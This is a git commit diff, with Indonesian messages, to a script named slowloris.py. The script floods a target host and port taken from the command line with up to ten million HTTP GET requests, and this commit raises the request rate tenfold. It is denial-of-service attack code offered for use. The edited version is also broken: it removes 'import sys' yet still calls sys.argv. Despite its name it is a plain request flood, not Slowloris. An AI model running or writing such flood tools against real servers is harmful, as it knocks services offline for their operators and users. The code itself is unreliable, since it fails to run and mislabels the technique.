7af4060b813b6d2423875e3450d73c88992a3322
baimdevelop <baimstore116@gmail.com>
2024-06-30 20:45:12 +0700

    Update slowloris.py

--- slowloris.py
+++ slowloris.py
@@ -1,17 +1,13 @@
-import sys
 import requests
 import time
 
-def main():
+def main(target, port):
     if len(sys.argv) != 3:
         print("Penggunaan: python slowloris.py <target> <port>")
         sys.exit(1)
-    
-    target = sys.argv[1]
-    port = int(sys.argv[2])
 
     start_time = time.time()
-    for i in range(10000000):  # Atur jumlah permintaan sebagai diperlukan
+    for i in range(10000000):
         try:
             response = requests.get(f"http://{target}:{port}")
             if response.status_code == 200:
@@ -22,11 +18,10 @@ def main():
             print(f"Request Belum Dikirim: {i+1} dari 10,000,000")
         if (i+1) % 1000 == 0:
             print(f"Terupdate {i+1} dari 10,000,000 dalam 1 detik")
-        if response.status_code == 200:
-            print(f"HTTP: On")
-        else:
-            print(f"HTTP: Off")
-        time.sleep(1)
+        time.sleep(0.1)
 
 if __name__ == "__main__":
-    main(
+    if len(sys.argv) != 3:
+        print("Penggunaan: python slowloris.py <target> <port>")
+        sys.exit(1)
+    main(sys.argv[1], int(sys.argv[2]))
